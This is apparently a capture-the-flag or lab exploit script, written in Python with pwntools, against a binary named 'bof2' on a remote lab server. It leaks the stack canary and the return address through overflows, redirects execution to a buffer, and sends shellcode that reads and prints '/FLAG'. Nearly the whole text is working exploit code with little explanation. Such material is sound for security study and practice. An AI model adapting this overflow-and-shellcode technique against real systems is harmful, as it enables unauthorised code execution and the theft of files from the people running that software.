from pwn import *

context.binary = './bof2'
elf = context.binary
context.terminal = ['tmux', 'splitw', '-h']
# context.log_level = 'debug'

# p = process()
p = remote('up.zoolab.org', 12343)

# -------------------------------------
# Step 1: Leak the canary using buf1
# -------------------------------------
banner = p.recvuntil(b"What's your name? ")
print(repr(banner))

payload1 = b"A" * 137  # buf1 is 0x90, canary is at rbp-0x8
p.send(payload1)

# read the echoed "Welcome, <input>"
response = p.recvuntil(b"What's the room number?", drop=True)
print(repr(response))
canary_partial = response.split(b"Welcome, ")[-1][137:137+7]
canary = b'\x00' + canary_partial
canary_val = u64(canary)
log.success(f"Leaked Canary: {hex(canary_val)}")



# -------------------------------------
# Step 2: Leak return address using buf2
# -------------------------------------

# payload2 = flat(
#     b"A" * 88, 
#     canary,  # canary 放在 offset 92 之後
#     b"B"*8            # rbp
# )

# payload2 = b"B" * 92        # buf2
# payload2 += canary_bytes          # overwrite the canary (rbp-0x8)
# payload2 += b"B" * 8        # dummy saved RBP

payload2 = b"b" * 104

print(f'payload2: {payload2}')

p.send(payload2)

response = p.recvuntil(b"What's the customer's name?")
print(repr(response))

leaked = response.split(b"The room number is: ")[-1][104:104+6] + b"\x00\x00"
print(f"leaked: {repr(leaked)}")
ret_addr = u64(leaked)
log.success(f"Leaked return address: {hex(ret_addr)}")


main_offset = elf.symbols['main']
msg_offset = elf.symbols['msg']
main_addr = ret_addr - 198
base_addr = main_addr - main_offset
msg_addr = base_addr + msg_offset

log.success(f"Main address: {hex(main_addr)}")
log.success(f"Base address: {hex(base_addr)}")
log.success(f"msg address:  {hex(msg_addr)}")

# utilize buf3 (rbp - 0x30) to rewrite the return address to msg's address
# payload2 = b"B" * 104 + p64(msg_addr)
payload3 = b"C" * 40
payload3 += canary
payload3 += b"C" * 8
payload3 += p64(msg_addr)

print(f"payload3: {payload3}")
p.send(payload3)

response = p.recvuntil(b"Leave your message")
print(repr(response))

# Step 6: Send shellcode
shellcode = asm("""
    /* openat */
    mov rax, 257
    mov rdi, -100
    lea rsi, [rip + path]
    xor rdx, rdx
    syscall

    mov rdi, rax
    lea rsi, [rsp + 100]
    mov edx, 64
    xor eax, eax
    syscall

    mov rdi, 1
    mov rax, 1
    syscall

    mov rax, 60
    xor rdi, rdi
    syscall

path:
""") + b"/FLAG\x00"


p.send(shellcode)

# print(f"[+] Attach to PID: {p.pid}")
# pause()  # <<<<<<<<<<<<<< 這邊最合適！
p.interactive()
